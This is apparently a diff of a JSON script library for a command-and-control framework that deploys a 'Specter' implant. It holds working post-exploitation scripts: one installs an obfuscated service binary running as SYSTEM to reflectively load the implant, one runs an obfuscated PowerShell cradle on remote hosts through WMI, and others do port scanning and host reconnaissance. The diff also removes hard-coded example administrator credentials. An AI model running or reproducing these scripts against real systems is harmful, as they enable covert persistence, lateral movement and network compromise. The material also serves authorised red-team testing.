@@ -38,13 +38,29 @@
     "version": 9,
     "isPremium": true,
     "labels": [
+      "command-and-scripting-interpreter",
       "command-line",
       "persistence",
+      "powershell",
       "scheduled-task",
       "windows",
-      "windows-command-shell",
-      "powershell",
-      "command-and-scripting-interpreter"
+      "windows-command-shell"
+    ],
+    "enabled": true
+  },
+  {
+    "identifier": "58046baaf95444358ed88bd696d451a8",
+    "name": "Get DNS Cache via Commandline",
+    "description": "This script retrieves the local DNS cache using ipconfig.",
+    "documentation": "# Overview\r\n\r\nRuns the ipconfig command to show the local DNS cache.\r\n\r\n# Dependencies\r\n\r\n- None\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Example Output\r\n\r\n```\r\nWindows IP Configuration\r\n\r\n    prod.detectportal.prod.cloudops.mozgcp.net\r\n    ----------------------------------------\r\n    Record Name . . . . . : prod.detectportal.prod.cloudops.mozgcp.net\r\n    Record Type . . . . . : 1\r\n    Time To Live  . . . . : 112\r\n    Data Length . . . . . : 4\r\n    Section . . . . . . . : Answer\r\n    A (Host) Record . . . : 34.107.221.82\r\n```",
+    "scriptBlock": "ipconfig /displaydns",
+    "version": 1,
+    "isPremium": true,
+    "labels": [
+      "command-line",
+      "discovery",
+      "host-discovery",
+      "windows-command-shell"
     ],
     "enabled": true
   },
@@ -81,6 +97,23 @@
     "enabled": true
   },
   {
+    "identifier": "041350b369ac4d2fba783a4a10823675",
+    "name": "Get Local TCP Listeners",
+    "description": "Leverages the C# BCL to retrieve a list of TCP listeners on the localhost.",
+    "documentation": "# Overview\r\n\r\nThis script retieves the following information for each TCP listener:\r\n\r\n# Dependencies\r\n\r\n- recon\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n- Linux\r\n- Mac\r\n\r\n# Example Output\r\n\r\n```\r\nAddressFamily  Address        Port\r\n-------------  -------        ----\r\nInterNetwork   0.0.0.0         135\r\nInterNetwork   0.0.0.0         445\r\nInterNetwork   0.0.0.0        5040\r\nInterNetwork   0.0.0.0        5985\r\nInterNetwork   0.0.0.0       47001\r\nInterNetwork   0.0.0.0       49664\r\nInterNetwork   0.0.0.0       49665\r\nInterNetwork   0.0.0.0       49666\r\nInterNetwork   0.0.0.0       49667\r\nInterNetwork   0.0.0.0       49668\r\nInterNetwork   0.0.0.0       49669\r\nInterNetwork   0.0.0.0       49670\r\nInterNetwork   127.0.0.1     27017\r\nInterNetwork   192.168.1.103   139\r\nInterNetworkV6 ::              135\r\nInterNetworkV6 ::              445\r\nInterNetworkV6 ::             5985\r\nInterNetworkV6 ::            47001\r\nInterNetworkV6 ::            49664\r\nInterNetworkV6 ::            49665\r\nInterNetworkV6 ::            49666\r\nInterNetworkV6 ::            49667\r\nInterNetworkV6 ::            49668\r\nInterNetworkV6 ::            49669\r\nInterNetworkV6 ::            49670\r\n```",
+    "scriptBlock": "load recon;\r\n\r\nGet-TcpListeners",
+    "version": 1,
+    "isPremium": true,
+    "labels": [
+      "api",
+      "linux",
+      "mac",
+      "recon",
+      "windows"
+    ],
+    "enabled": true
+  },
+  {
     "identifier": "29b544d341cf4660865c9d6b57fa1dfc",
     "name": "Get Current Process Information",
     "description": "Get detailed information about the current process such as the full path to the executable, commandline args, integrity level, and bitness.",
@@ -106,23 +139,6 @@
       "api",
       "input-capture",
       "keylogging"
-    ],
-    "enabled": true
-  },
-  {
-    "identifier": "041350b369ac4d2fba783a4a10823675",
-    "name": "Get Local TCP Listeners",
-    "description": "Leverages the C# BCL to retrieve a list of TCP listeners on the localhost.",
-    "documentation": "# Overview\r\n\r\nThis script retieves the following information for each TCP listener:\r\n\r\n# Dependencies\r\n\r\n- recon\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n- Linux\r\n- Mac\r\n\r\n# Example Output\r\n\r\n```\r\nAddressFamily  Address        Port\r\n-------------  -------        ----\r\nInterNetwork   0.0.0.0         135\r\nInterNetwork   0.0.0.0         445\r\nInterNetwork   0.0.0.0        5040\r\nInterNetwork   0.0.0.0        5985\r\nInterNetwork   0.0.0.0       47001\r\nInterNetwork   0.0.0.0       49664\r\nInterNetwork   0.0.0.0       49665\r\nInterNetwork   0.0.0.0       49666\r\nInterNetwork   0.0.0.0       49667\r\nInterNetwork   0.0.0.0       49668\r\nInterNetwork   0.0.0.0       49669\r\nInterNetwork   0.0.0.0       49670\r\nInterNetwork   127.0.0.1     27017\r\nInterNetwork   192.168.1.103   139\r\nInterNetworkV6 ::              135\r\nInterNetworkV6 ::              445\r\nInterNetworkV6 ::             5985\r\nInterNetworkV6 ::            47001\r\nInterNetworkV6 ::            49664\r\nInterNetworkV6 ::            49665\r\nInterNetworkV6 ::            49666\r\nInterNetworkV6 ::            49667\r\nInterNetworkV6 ::            49668\r\nInterNetworkV6 ::            49669\r\nInterNetworkV6 ::            49670\r\n```",
-    "scriptBlock": "load recon;\r\n\r\nGet-TcpListeners",
-    "version": 1,
-    "isPremium": true,
-    "labels": [
-      "api",
-      "linux",
-      "mac",
-      "recon",
-      "windows"
     ],
     "enabled": true
   },
@@ -153,13 +169,13 @@
     "version": 8,
     "isPremium": true,
     "labels": [
+      "command-and-scripting-interpreter",
       "command-line",
       "lateral-movement",
+      "powershell",
       "scheduled-task",
       "windows",
-      "windows-command-shell",
-      "command-and-scripting-interpreter",
-      "powershell"
+      "windows-command-shell"
     ],
     "enabled": true
   },
@@ -181,8 +197,8 @@
     "name": "Lateral Movement with WMI and PowerShell Cradle via API",
     "description": "Run a PowerShell cradle on a remote system using the WMI API.",
     "documentation": "# Overview\r\n\r\nThis script leverages Windows Management Instrumentation (WMI) to start a process on the operator specified system using username and password or impersonation. An obfuscated PowerShell cradle is executed as either the specified user. The $Target parameter can be either hostname, FQDN, or IP.\r\n\r\n# Dependencies\r\n\r\n- None\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Pre-Requisites\r\n\r\n- Valid administrator credentials for the target systems.\r\n- WMI service must be running on the remote system.\r\n- WMI must be allowed through the firewall.\r\n\r\n# Example Output\r\n\r\n```\r\n__GENUS          : 2\r\n__CLASS          : __PARAMETERS\r\n__SUPERCLASS     : \r\n__DYNASTY        : __PARAMETERS\r\n__RELPATH        : \r\n__PROPERTY_COUNT : 2\r\n__DERIVATION     : {}\r\n__SERVER         : \r\n__NAMESPACE      : \r\n__PATH           : \r\nProcessId        : 4556\r\nReturnValue      : 0\r\n```",
-    "scriptBlock": "param(\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Target,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The local or domain username to authenticate with.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Username,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The password for the specified user.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Password,\r\n\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Build]\r\n    [string]$Build\r\n)\r\n\r\n#Generate a new PowerShell cradle command\r\n$Command = payload -Build $Build -Kind 'ps_command';\r\n\r\n#Execute command on remote system using WMI commandline executable\r\nif(![String]::IsNullOrEmpty($Username) -and $Password -ne $null) {\r\n    #Run with explicit credentials\r\n    $Username = \"administrator@lab.net\"\r\n    $Password = \"1qaz!QAZ\"\r\n    $SecurePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force\r\n    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword\r\n\r\n    Invoke-WmiMethod -Class \"WIN32_PROCESS\" -Name \"Create\" -ArgumentList $Command -ComputerName $Target -Credential $Credential\r\n} else {\r\n    #Run with impersonation\r\n    Invoke-WmiMethod -Class \"WIN32_PROCESS\" -Name \"Create\" -ArgumentList $Command -ComputerName $Target\r\n}",
-    "version": 1,
+    "scriptBlock": "param(\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Target,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The local or domain username to authenticate with.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Username,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The password for the specified user.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Password,\r\n\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Build]\r\n    [string]$Build\r\n)\r\n\r\n#Generate a new PowerShell cradle command\r\n$Command = payload -Build $Build -Kind 'ps_command';\r\n\r\n#Execute command on remote system using WMI commandline executable\r\nif(![String]::IsNullOrEmpty($Username) -and $Password -ne $null) {\r\n    #Run with explicit credentials\r\n    $SecurePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force\r\n    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword\r\n\r\n    Invoke-WmiMethod -Class \"WIN32_PROCESS\" -Name \"Create\" -ArgumentList $Command -ComputerName $Target -Credential $Credential\r\n} else {\r\n    #Run with impersonation\r\n    Invoke-WmiMethod -Class \"WIN32_PROCESS\" -Name \"Create\" -ArgumentList $Command -ComputerName $Target\r\n}",
+    "version": 2,
     "isPremium": true,
     "labels": [
       "api",
@@ -253,12 +269,12 @@
     "version": 4,
     "isPremium": true,
     "labels": [
+      "command-and-scripting-interpreter",
       "command-line",
+      "powershell",
       "privilege-escalation",
       "windows",
-      "windows-command-shell",
-      "powershell",
-      "command-and-scripting-interpreter"
+      "windows-command-shell"
     ],
     "enabled": true
   },
@@ -364,8 +380,8 @@
     "name": "Get Detailed Process Information",
     "description": "Get detailed information about all running processes such as the full path to the executable, commandline args, integrity level, and bitness.",
     "documentation": "# Overview\r\n\r\nGet detailed information about the current process including:\r\n\r\n- Commandline arguments\r\n- Process Integrity Level\r\n- Process Id\r\n- Parent Process Id\r\n- Name\r\n- Full path to the executable\r\n- Username and domain name (if applicable)\r\n- Bitness (either x86 or x64)\r\n\r\n# Dependencies\r\n\r\n- Common\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Pre-Requisites\r\n\r\n- No pre-requisites for processes running under the same user context.\r\n- High Integrity process will be required to query information for other user processes.\r\n\r\n# Example Text\r\n\r\n```\r\nCommandLine    : \r\nIntegrityLevel : Unknown\r\nPID            : 0\r\nPPID           : 0\r\nName           : System Idle Process\r\nPath           : \r\nUsername       : NT AUTHORITY\\SYSTEM\r\nBitness        : Unknown\r\n\r\nCommandLine    : \r\nIntegrityLevel : Unknown\r\nPID            : 4\r\nPPID           : 0\r\nName           : \r\nPath           : \r\nUsername       : \r\nBitness        : x64\r\n\r\nCommandLine    : C:\\Windows\\system32\\svchost.exe -k LocalServiceNetworkRestricted -p -s Dhcp\r\nIntegrityLevel : System\r\nPID            : 1652\r\nPPID           : 744\r\nName           : svchost.exe\r\nPath           : C:\\Windows\\System32\\svchost.exe\r\nUsername       : NT AUTHORITY\\LOCAL SERVICE\r\nBitness        : x64\r\n```\r\n\r\n# Example Json\r\n\r\n```json\r\n[\r\n  {\r\n    \"CommandLine\": \"\",\r\n    \"IntegrityLevel\": \"Unknown\",\r\n    \"PID\": 0,\r\n    \"PPID\": 0,\r\n    \"Name\": \"System Idle Process\",\r\n    \"Path\": \"\",\r\n    \"Username\": \"NT AUTHORITY\\\\SYSTEM\",\r\n    \"Bitness\": \"Unknown\"\r\n  },\r\n  {\r\n    \"CommandLine\": \"\",\r\n    \"IntegrityLevel\": \"Unknown\",\r\n    \"PID\": 4,\r\n    \"PPID\": 0,\r\n    \"Name\": \"\",\r\n    \"Path\": \"\",\r\n    \"Username\": \"\",\r\n    \"Bitness\": \"x64\"\r\n  },\r\n  {\r\n    \"CommandLine\": \"C:\\\\Windows\\\\system32\\\\svchost.exe -k LocalServiceNetworkRestricted -p -s Dhcp\",\r\n    \"IntegrityLevel\": \"System\",\r\n    \"PID\": 1652,\r\n    \"PPID\": 744,\r\n    \"Name\": \"svchost.exe\",\r\n    \"Path\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\",\r\n    \"Username\": \"NT AUTHORITY\\\\LOCAL SERVICE\",\r\n    \"Bitness\": \"x64\"\r\n  }\r\n]\r\n```",
-    "scriptBlock": "load common;\r\n\r\nSurvey-Processes -Detailed",
-    "version": 1,
+    "scriptBlock": "load common;\r\n\r\nSurvey-Processes -Detailed | Select PID,PPID,Architecture,IntegrityLevel,Username,Path,Name,CommandLine",
+    "version": 2,
     "isPremium": true,
     "labels": [
       "api",
@@ -458,6 +474,17 @@
     "enabled": true
   },
   {
+    "identifier": "032b8f7d9c47439bbb7adff2321c669d",
+    "name": "Terminate Session",
+    "description": "This script stops or terminates the current session.",
+    "documentation": "# Overview\r\n\r\nThis script calls the burnoff cmdlet which triggers the implant to shutdown.\r\n\r\n# Dependencies\r\n\r\n* None",
+    "scriptBlock": "burnoff",
+    "version": 1,
+    "isPremium": true,
+    "labels": [],
+    "enabled": true
+  },
+  {
     "identifier": "e96b5ec570fb41e28cf48b3798e9cd45",
     "name": "Get TCP Redirectors via API",
     "description": "Gets a list of active TCP listener in the current process.",
@@ -471,17 +498,6 @@
       "lateral-movement",
       "proxy"
     ],
-    "enabled": true
-  },
-  {
-    "identifier": "032b8f7d9c47439bbb7adff2321c669d",
-    "name": "Terminate Session",
-    "description": "This script stops or terminates the current session.",
-    "documentation": "# Overview\r\n\r\nThis script calls the burnoff cmdlet which triggers the implant to shutdown.\r\n\r\n# Dependencies\r\n\r\n* None",
-    "scriptBlock": "burnoff",
-    "version": 1,
-    "isPremium": true,
-    "labels": [],
     "enabled": true
   },
   {
@@ -522,13 +538,13 @@
     "version": 5,
     "isPremium": true,
     "labels": [
+      "command-and-scripting-interpreter",
       "command-line",
       "persistence",
+      "powershell",
       "scheduled-task",
       "windows",
-      "windows-command-shell",
-      "powershell",
-      "command-and-scripting-interpreter"
+      "windows-command-shell"
     ],
     "enabled": true
   },
@@ -658,6 +674,41 @@
     "enabled": true
   },
   {
+    "identifier": "7e881c0602f34056acf62c36676ceb22",
+    "name": "Get System Info via Commandline",
+    "description": "Lists system information about the local or remote system.",
+    "documentation": "# Overview\r\n\r\nRuns the systeminfo command to retrieve properties of the local or remote system.\r\n\r\n# Dependencies\r\n\r\n- None\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Pre-Requisites:\r\n\r\n- Authenticated user for remote access.\r\n\r\n# Example Output\r\n\r\n```\r\nHost Name:                 DESKTOP-LMCH70V\r\nOS Name:                   Microsoft Windows 10 Pro\r\nOS Version:                10.0.19045 N/A Build 19045\r\nOS Manufacturer:           Microsoft Corporation\r\nOS Configuration:          Standalone Workstation\r\nOS Build Type:             Multiprocessor Free\r\nRegistered Owner:          helpdesk\r\nRegistered Organization:\r\nProduct ID:                00330-80000-00000-AA108\r\nOriginal Install Date:     12/30/2021, 10:57:26 PM\r\nSystem Boot Time:          1/23/2024, 6:26:59 PM\r\nSystem Manufacturer:       VMware, Inc.\r\nSystem Model:              VMware7,1\r\nSystem Type:               x64-based PC\r\nProcessor(s):              1 Processor(s) Installed.\r\n                           [01]: Intel64 Family 6 Model 94 Stepping 3 GenuineIntel ~2712 Mhz\r\nBIOS Version:              VMware, Inc. VMW71.00V.18452719.B64.2108091906, 8/9/2021\r\nWindows Directory:         C:\\Windows\r\nSystem Directory:          C:\\Windows\\system32\r\nBoot Device:               \\Device\\HarddiskVolume1\r\nSystem Locale:             en-us;English (United States)\r\nInput Locale:              en-us;English (United States)\r\nTime Zone:                 (UTC-08:00) Pacific Time (US & Canada)\r\nTotal Physical Memory:     8,191 MB\r\nAvailable Physical Memory: 1,648 MB\r\nVirtual Memory: Max Size:  25,254 MB\r\nVirtual Memory: Available: 9,971 MB\r\nVirtual Memory: In Use:    15,283 MB\r\nPage File Location(s):     C:\\pagefile.sys\r\nDomain:                    WORKGROUP\r\nLogon Server:              \\\\DESKTOP-LMCH70V\r\nHotfix(s):                 15 Hotfix(s) Installed.\r\n                           [01]: KB5033918\r\n                           [02]: KB5028951\r\n                           [03]: KB5003791\r\n                           [04]: KB5011048\r\n                           [05]: KB5015684\r\n                           [06]: KB5034122\r\n                           [07]: KB5007273\r\n                           [08]: KB5026879\r\n                           [09]: KB5028318\r\n                           [10]: KB5028380\r\n                           [11]: KB5029709\r\n                           [12]: KB5031539\r\n                           [13]: KB5032392\r\n                           [14]: KB5032907\r\n                           [15]: KB5005699\r\nNetwork Card(s):           2 NIC(s) Installed.\r\n                           [01]: Intel(R) 82574L Gigabit Network Connection\r\n                                 Connection Name: Ethernet0\r\n                                 DHCP Enabled:    Yes\r\n                                 DHCP Server:     192.168.132.254\r\n                                 IP address(es)\r\n                                 [01]: 192.168.132.135\r\n                                 [02]: fe80::e291:3de2:b903:b8ac\r\n                           [02]: Intel(R) 82574L Gigabit Network Connection\r\n                                 Connection Name: Ethernet1\r\n                                 DHCP Enabled:    Yes\r\n                                 DHCP Server:     192.168.1.2\r\n                                 IP address(es)\r\n                                 [01]: 192.168.1.101\r\n                                 [02]: fe80::2150:2b0b:6e7e:8082\r\nHyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.\r\n```",
+    "scriptBlock": "param(\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Target = \"localhost\",\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The local or domain username to authenticate with.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Username,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The password for the specified user.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Password\r\n)\r\n\r\nif(![String]::IsNullOrEmpty($Username) -and $Password -ne $null) {\r\n    systeminfo /S $Target /U $Username /P $Password;\r\n} else {\r\n    systeminfo /S $Target;\r\n}",
+    "version": 1,
+    "isPremium": true,
+    "labels": [
+      "command-line",
+      "discovery",
+      "host-discovery",
+      "windows-command-shell"
+    ],
+    "enabled": true
+  },
+  {
+    "identifier": "e8606fe5f72f4268a380161b3fbc59c0",
+    "name": "Persistence Using Service Control Manager and Obfuscated Service Binary",
+    "description": "This script establishes persistence by installing a obfuscated .NET service binary that reflectively loads a Specter implant.",
+    "documentation": "# Overview\r\n\r\nThis script generates an obfuscated .NET service binary, saves it to disk, and then leverages the Service Control Manager API to create and run a service on the localhost that starts the service binary. The service will be run under the NT AUTHORITY\\SYSTEM account.\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Dependencies\r\n\r\n- common\r\n- lateral\r\n\r\n# Pre-Requisites\r\n\r\n- Administrator rights\r\n- High integrity process",
+    "scriptBlock": "param(\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Build]\r\n    [string]$Build,\r\n\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The folder where the service directory will be created.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]$Directory = \"C:\\Program Files\\\",\r\n\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The type of payload to drop.\")]\r\n    [ValidateSet(\"csharp_service_load_module\", \"csharp_service_powershell_host\")]\r\n    [string]$Payload = \"csharp_service_load_module\",\r\n\r\n    [Parameter(Mandatory = $false, HelpMessage = \"Determines whether or not to start the persistence method immediately.\")]\r\n    [bool]$StartImmediately = $false\r\n)\r\n\r\nload common;\r\nload lateral;\r\n\r\n#Generate a new PowerShell cradle command\r\n$contents = payload -Build $Build -Kind $Payload;\r\n$config = payload -Build $Build -Kind 'csharp_config';\r\n\r\n#Get the filename of the payload\r\n$assembly = [System.Reflection.Assembly]::Load($contents);\r\n$filename = $assembly.GetName();\r\n$serviceName = $filename.Name + \"Svc\";\r\n\r\n#Define the paths\r\n$localRootPath = [System.IO.Path]::Combine($Directory, $filename.Name);\r\n$localBinaryPath = [System.IO.Path]::Combine($localRootPath, $filename.Name + \".exe\");\r\n\r\n#Copy the payload to the remote system\r\ntry {\r\n    [void][System.IO.Directory]::CreateDirectory($localRootPath);\r\n    [System.IO.File]::WriteAllBytes($localBinaryPath, $contents);\r\n    [System.IO.File]::WriteAllText($localBinaryPath + \".config\", $config);\r\n\r\n    #Create the service\r\n    $nostart = !$StartImmediately;\r\n    Create-Service -ComputerName \"localhost\" -ServiceName $serviceName -Path $localBinaryPath -NoStart:$nostart;\r\n    $success = $true;\r\n} catch {\r\n    $success = $false;\r\n    throw;\r\n}\r\n\r\nNew-Object psobject -Property @{\r\n    Persistence = New-Object psobject -Property @{\r\n        Method = \"System Sevice\";\r\n        Profile = \"System\";\r\n        Trigger = \"OnStart\";\r\n        Event = \"Create\";\r\n        Build = $Build;\r\n        Payload = $Payload;\r\n        Path = $localBinaryPath;\r\n        Success = $success;\r\n        UninstallScript = @\"\r\ntry {\r\n    Remove-Service -Name '$serviceName';\r\n    [System.IO.Directory]::Delete('$localRootPath');\r\n    `$success = `$true;\r\n} catch {\r\n    `$success = `$false;\r\n}\r\n\r\nNew-Object psobject -Property @{\r\n    Persistence = New-Object psobject -Property @{\r\n        Method = 'System Sevice';\r\n        Profile = 'System';\r\n        Trigger = 'OnStart';\r\n        Event = 'Delete';\r\n        Build = '$Build';\r\n        Payload = '$Payload';\r\n        Path = '$localBinaryPath';\r\n        Success = `$success;\r\n    };\r\n};\r\n\"@;\r\n    };\r\n};",
+    "version": 9,
+    "isPremium": true,
+    "labels": [
+      "api",
+      "event-triggered-execution",
+      "persistence",
+      "service-execution",
+      "system-services",
+      "windows",
+      "windows-service"
+    ],
+    "enabled": true
+  },
+  {
     "identifier": "aa36da9368e34ba9922e2d3c4711c28e",
     "name": "Find Password Files",
     "description": "Finds files that might have passwords in them.",
@@ -735,6 +786,22 @@
     "enabled": true
   },
   {
+    "identifier": "549dd49453dc44d7b68d24d86ede5bb5",
+    "name": "Get Windows Interfaces via Commandline",
+    "description": "Runs ipconfig to show the local network interfaces.",
+    "documentation": "# Overview\r\n\r\nUses the ipconfig command to show the local network interfaces configuration.\r\n\r\n# Dependencies\r\n\r\n- None\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Example Output\r\n\r\n```\r\nWindows IP Configuration\r\n\r\n   Host Name . . . . . . . . . . . . : DESKTOP-LMCH70V\r\n   Primary Dns Suffix  . . . . . . . :\r\n   Node Type . . . . . . . . . . . . : Hybrid\r\n   IP Routing Enabled. . . . . . . . : No\r\n   WINS Proxy Enabled. . . . . . . . : No\r\n   DNS Suffix Search List. . . . . . : localdomain\r\n                                       home.arpa\r\n\r\nEthernet adapter Ethernet0:\r\n\r\n   Connection-specific DNS Suffix  . : localdomain\r\n   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection\r\n   Physical Address. . . . . . . . . : 00-0C-29-76-5E-EE\r\n   DHCP Enabled. . . . . . . . . . . : Yes\r\n   Autoconfiguration Enabled . . . . : Yes\r\n   Link-local IPv6 Address . . . . . : fe80::e291:3de2:b903:b8ac%10(Preferred)\r\n   IPv4 Address. . . . . . . . . . . : 192.168.132.135(Preferred)\r\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\r\n   Lease Obtained. . . . . . . . . . : Tuesday, January 23, 2024 6:28:38 PM\r\n   Lease Expires . . . . . . . . . . : Thursday, January 25, 2024 10:26:28 AM\r\n   Default Gateway . . . . . . . . . : 192.168.132.2\r\n   DHCP Server . . . . . . . . . . . : 192.168.132.254\r\n   DHCPv6 IAID . . . . . . . . . . . : 100666409\r\n   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-60-61-B0-00-0C-29-76-5E-EE\r\n   DNS Servers . . . . . . . . . . . : 192.168.132.2\r\n   Primary WINS Server . . . . . . . : 192.168.132.2\r\n   NetBIOS over Tcpip. . . . . . . . : Enabled\r\n```",
+    "scriptBlock": "ipconfig /all",
+    "version": 3,
+    "isPremium": true,
+    "labels": [
+      "command-line",
+      "discovery",
+      "host-discovery",
+      "windows-command-shell"
+    ],
+    "enabled": true
+  },
+  {
     "identifier": "5cbb39108ffb45e1afec7dd51960eba9",
     "name": "Get Computers and IP Addresses in Active Directory",
     "description": "This script queries the local Active Directory instance for the FQDN, IP addresses, and OS Version of each computer in Active Directory.",
@@ -770,8 +837,8 @@
     "name": "Port Scan Target System",
     "description": "Scan a few targets with a broad range of ports.",
     "documentation": "# Overview\r\n\r\nThe purpose of this script is to scan a few target IP addresses or CIDR networks with a broad range of common ports.\r\n\r\n# Inputs\r\n\r\n**Targets:** A list of IP addresses or CIDR ranges to scan (e.g. 10.0.0.14 or 192.168.0.0/24).\r\n\r\n**Ports:** A list of ports to scan. The default ports are 21, 22, 23, 25, 53, 80, 88, 111, 139, 389, 443, 445, 873, 1099, 1433, 1521, 1723, 2049, 2100, 2121, 3299, 3306, 3389, 3632, 4369, 5038, 5060, 5432, 5555, 5900, 5985, 6000, 6379, 6667, 8000, 8080, 8443, 9200, and 27017.\r\n\r\n# Example Output\r\n\r\n```\r\nIPAddress : 10.0.0.14\r\n21        : Filtered\r\n22        : Filtered\r\n23        : Filtered\r\n25        : Filtered\r\n53        : Filtered\r\n80        : Open\r\n88        : Filtered\r\n111       : Filtered\r\n139       : Open\r\n389       : Filtered\r\n443       : Filtered\r\n445       : Open\r\n873       : Filtered\r\n1099      : Filtered\r\n1433      : Filtered\r\n1521      : Filtered\r\n1723      : Filtered\r\n2049      : Filtered\r\n2100      : Filtered\r\n2121      : Filtered\r\n3299      : Filtered\r\n3306      : Filtered\r\n3389      : Open\r\n3632      : Filtered\r\n4369      : Filtered\r\n5038      : Filtered\r\n5060      : Filtered\r\n5432      : Filtered\r\n5555      : Filtered\r\n5900      : Filtered\r\n5985      : Filtered\r\n6000      : Filtered\r\n6379      : Filtered\r\n6667      : Filtered\r\n8000      : Filtered\r\n8080      : Filtered\r\n8443      : Filtered\r\n9200      : Filtered\r\n27017     : Filtered\r\n```\r\n\r\n",
-    "scriptBlock": "param(\r\n    [Parameter(Mandatory = $true, HelpMessage = \"A comma-separated list of domain names, IPs, or IP ranges to scan.\")]\r\n    [string[]]$Targets = @('10.0.0.14'),\r\n\r\n    [Parameter(Mandatory = $true, HelpMessage = \"A comma-separated list of ports to scan.\")]\r\n    [int[]]$Ports = @(21, 22, 23, 25, 53, 80, 88, 111, 139, 389, 443, 445, 873, 1099, 1433, 1521, 1723, 2049, 2100, 2121, 3299, 3306, 3389, 3632, 4369, 5038, 5060, 5432, 5555, 5900, 5985, 6000, 6379, 6667, 8000, 8080, 8443, 9200, 27017)\r\n)\r\n\r\nscan -Targets $Targets -Ports $Ports",
-    "version": 2,
+    "scriptBlock": "param(\r\n    [Parameter(Mandatory = $true, HelpMessage = \"A comma-separated list of domain names, IPs, or IP ranges to scan.\")]\r\n    [string[]]$Targets = @('10.0.0.14'),\r\n\r\n    [Parameter(Mandatory = $true, HelpMessage = \"A comma-separated list of ports to scan.\")]\r\n    [int[]]$Ports = @(21, 22, 23, 25, 53, 80, 88, 111, 139, 389, 443, 445, 873, 1099, 1433, 1521, 1723, 2049, 2100, 2121, 3299, 3306, 3389, 3632, 4369, 5038, 5060, 5432, 5555, 5900, 5985, 6000, 6379, 6667, 8000, 8080, 8443, 9200, 27017)\r\n)\r\n\r\nload recon;\r\n\r\nscan -Targets $Targets -Ports $Ports;",
+    "version": 3,
     "isPremium": true,
     "labels": [
       "active",
@@ -915,26 +982,6 @@
     "enabled": true
   },
   {
-    "identifier": "97d6b0d64b4548b3b3e597786e97823c",
-    "name": "User Persistence with Scheduled Task Commandline and PowerShell Cradle",
-    "description": "Installs persistence by creating a scheduled task to run a PowerShell cradle on user logon.",
